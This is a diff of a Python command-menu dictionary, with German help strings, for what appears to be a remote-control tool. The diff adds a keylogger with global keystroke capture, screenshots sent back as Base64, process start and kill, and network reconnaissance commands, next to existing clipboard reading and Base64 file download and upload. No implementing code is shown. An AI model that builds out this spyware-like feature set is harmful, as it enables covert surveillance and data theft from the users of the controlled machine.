@@ -17,45 +17,62 @@ BORDER_COLOR = '#1a1a1a'  # Dunkelgrau für Rahmen
 COMMAND_CATEGORIES = {
     "System": {
         "help": "Zeigt diese Hilfe an",
-        "time": "Gibt die aktuelle Uhrzeit zurück",
-        "date": "Gibt das aktuelle Datum zurück",
-        "hostname": "Gibt den Rechnernamen zurück",
         "os": "Betriebssystemname und Version",
+        "hostname": "Rechnername",
         "whoami": "Aktuell angemeldeter Benutzer",
-        "uptime": "Wie lange der Rechner läuft (systembefehl)",
-        "shutdown": "Fährt den Rechner herunter",
-        "reboot": "Startet den Rechner neu",
-    },
-    "Datei & Verzeichnis": {
-        "cwd": "Aktuelles Arbeitsverzeichnis",
-        "listdir <pfad>": "Listet Dateien und Ordner im Verzeichnis (Standard: .) (max. 50 Einträge)",
-        "mkdir <pfad>": "Erstellt Verzeichnis",
-        "rmdir <pfad>": "Löscht leeres Verzeichnis",
-        "delete <pfad>": "Löscht Datei",
-        "tree <pfad>": "Zeigt Verzeichnisstruktur als Baum",
-        "download <pfad>": "Sendet Datei als Base64",
-        "upload <pfad> <base64>": "Speichert Datei aus Base64",
-    },
-    "System-Informationen": {
-        "disk": "Zeigt Speicherplatz auf Platte (systembefehl)",
-        "env": "Zeigt Umgebungsvariablen (systembefehl, max. 50)",
+        "users": "Alle eingeloggten Benutzer",
+        "env": "Umgebungsvariablen anzeigen (systembefehl)",
         "cpu": "CPU-Informationen (systembefehl)",
-        "memory": "Arbeitsspeicher-Auslastung (systembefehl)",
-        "processes": "Zeigt laufende Prozesse",
-        "users": "Zeigt eingeloggte Benutzer",
-        "lsusb": "Zeigt USB-Geräte (nur Linux/Mac)",
+        "memory": "RAM-Auslastung (systembefehl)",
+        "disk": "Festplattenplatz (systembefehl)",
+        "uptime": "Systemlaufzeit (systembefehl)",
+        "ipconfig": "Netzwerk-Konfiguration",
+        "netstat": "Offene Netzwerkverbindungen",
+        "lsusb": "USB-Geräte (Linux/Mac)",
+        "lspci": "PCI-Geräte (Linux)",
+        "wmic": "Windows Management Instrumentation (Windows)",
+        "shutdown": "Rechner herunterfahren",
+        "reboot": "Rechner neu starten"
+    },
+    "Dateisystem": {
+        "cwd": "Aktuelles Arbeitsverzeichnis",
+        "listdir <pfad>": "Dateien/Ordner auflisten (Standard: .)",
+        "tree <pfad>": "Verzeichnisbaum anzeigen",
+        "mkdir <pfad>": "Verzeichnis erstellen",
+        "rmdir <pfad>": "Verzeichnis löschen (nur leere Verzeichnisse)",
+        "delete <pfad>": "Datei löschen",
+        "download <pfad>": "Datei als Base64 senden",
+        "upload <pfad> <base64>": "Datei aus Base64 speichern"
+    },
+    "Prozesse & Benutzer": {
+        "processes": "Laufende Prozesse anzeigen",
+        "kill <pid>": "Prozess beenden",
+        "start <befehl>": "Prozess starten"
     },
     "Netzwerk": {
-        "ping <host>": "Ping an Host (systembefehl, 3 Pakete)",
-        "netstat": "Zeigt offene Netzwerkverbindungen",
-        "ipconfig": "Zeigt Netzwerk-Konfiguration",
+        "ping <host>": "Host anpingen (3 Pakete)",
+        "traceroute <host>": "Route zu Host anzeigen",
+        "ifconfig": "Netzwerkschnittstellen (Linux/Mac)",
+        "route": "Routing-Tabelle anzeigen"
     },
-    "Sonstiges": {
-        "clipboard": "Inhalt der Zwischenablage",
-        "echo <text>": "Sendet den Text zurück",
-        "reverse <text>": "Gibt den Text rückwärts aus",
-        "screenshot": "Macht Screenshot und speichert temporär",
-        "exit": "Beendet die Verbindung und das Programm",
+    "Systemsteuerung": {
+        "shutdown": "Rechner herunterfahren",
+        "reboot": "Rechner neu starten",
+        "logoff": "Benutzer abmelden",
+        "lock": "Bildschirm sperren (Windows)"
+    },
+    "Clipboard & Screenshot": {
+        "clipboard": "Inhalt der Zwischenablage anzeigen",
+        "screenshot": "Screenshot als Base64 senden"
+    },
+    "Text/Utility": {
+        "echo <text>": "Text zurückgeben",
+        "reverse <text>": "Text rückwärts ausgeben"
+    },
+    "Keylogger": {
+        "keylogger start": "Keylogger starten (globale Tastenerfassung)",
+        "keylogger stop": "Keylogger stoppen",
+        "keylogger status": "Keylogger-Status anzeigen"
     }
 }
 
